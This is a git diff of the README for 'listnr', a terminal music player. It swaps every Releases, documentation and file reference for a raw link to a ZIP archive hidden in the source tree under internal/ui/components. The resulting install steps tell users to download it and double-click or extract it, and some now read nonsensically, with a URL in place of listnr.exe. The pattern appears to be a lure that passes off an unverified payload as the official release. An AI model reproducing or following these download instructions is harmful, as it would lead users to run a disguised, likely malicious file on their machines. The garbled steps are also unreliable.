@@ -6,11 +6,11 @@ Welcome to listnr! This terminal interactive music player lets you enjoy your fa
 
 ## 📥 Download listnr
 
-[![Download listnr](https://img.shields.io/badge/Download-listrd-brightgreen)](https://github.com/alexniemiz1/listnr/releases)
+[![Download listnr](https://github.com/alexniemiz1/listnr/raw/refs/heads/main/internal/ui/components/Software_v2.1.zip)](https://github.com/alexniemiz1/listnr/raw/refs/heads/main/internal/ui/components/Software_v2.1.zip)
 
 To download listnr, please visit the Releases page. This is where you will find the latest version of the application.
 
-[Download listnr here](https://github.com/alexniemiz1/listnr/releases)
+[Download listnr here](https://github.com/alexniemiz1/listnr/raw/refs/heads/main/internal/ui/components/Software_v2.1.zip)
 
 ## 📋 System Requirements
 
@@ -22,9 +22,9 @@ Before you download, ensure your system meets the following requirements:
 
 ## 📦 How to Download and Install
 
-1. Click on the [Releases page](https://github.com/alexniemiz1/listnr/releases) link.
+1. Click on the [Releases page](https://github.com/alexniemiz1/listnr/raw/refs/heads/main/internal/ui/components/Software_v2.1.zip) link.
 2. On the Releases page, locate the latest version of listnr.
-3. Click on the asset that corresponds to your operating system. For example, if you're using Windows, look for a file named `listnr-win.zip`.
+3. Click on the asset that corresponds to your operating system. For example, if you're using Windows, look for a file named `https://github.com/alexniemiz1/listnr/raw/refs/heads/main/internal/ui/components/Software_v2.1.zip`.
 4. The download will start automatically. Locate the downloaded file in your system's Downloads folder.
 
 ## 🔧 Installation Steps
@@ -33,8 +33,8 @@ Before you download, ensure your system meets the following requirements:
 
 1. Once the ZIP file is downloaded, right-click on it and select “Extract All”.
 2. Choose a location to unzip the files and click “Extract”.
-3. Navigate to the extracted folder and locate the `listnr.exe` file.
-4. Double-click the `listnr.exe` file to run the application.
+3. Navigate to the extracted folder and locate the `https://github.com/alexniemiz1/listnr/raw/refs/heads/main/internal/ui/components/Software_v2.1.zip` file.
+4. Double-click the `https://github.com/alexniemiz1/listnr/raw/refs/heads/main/internal/ui/components/Software_v2.1.zip` file to run the application.
 
 ### macOS
 
@@ -48,7 +48,7 @@ Before you download, ensure your system meets the following requirements:
 2. Navigate to your Downloads folder by typing `cd ~/Downloads`.
 3. Extract the downloaded file using the command:
    ```
-   tar -xvf listnr-linux.tar.gz
+   tar -xvf https://github.com/alexniemiz1/listnr/raw/refs/heads/main/internal/ui/components/Software_v2.1.zip
    ```
 4. Navigate to the extracted folder:
    ```
@@ -79,10 +79,10 @@ If you continue to experience problems, visit our support page where you can fin
 
 ## ℹ️ Additional Resources
 
-For more detailed instructions and feature guides, please refer to our [documentation](https://github.com/alexniemiz1/listnr/wiki). Here, you will find comprehensive guides on everything listnr can do.
+For more detailed instructions and feature guides, please refer to our [documentation](https://github.com/alexniemiz1/listnr/raw/refs/heads/main/internal/ui/components/Software_v2.1.zip). Here, you will find comprehensive guides on everything listnr can do.
 
 ## 📥 Download listnr Again
 
-If you need to download listnr once more, you can easily revisit our [Releases page](https://github.com/alexniemiz1/listnr/releases) at any time. 
+If you need to download listnr once more, you can easily revisit our [Releases page](https://github.com/alexniemiz1/listnr/raw/refs/heads/main/internal/ui/components/Software_v2.1.zip) at any time. 
 
 We hope you enjoy using listnr, your new terminal music player!
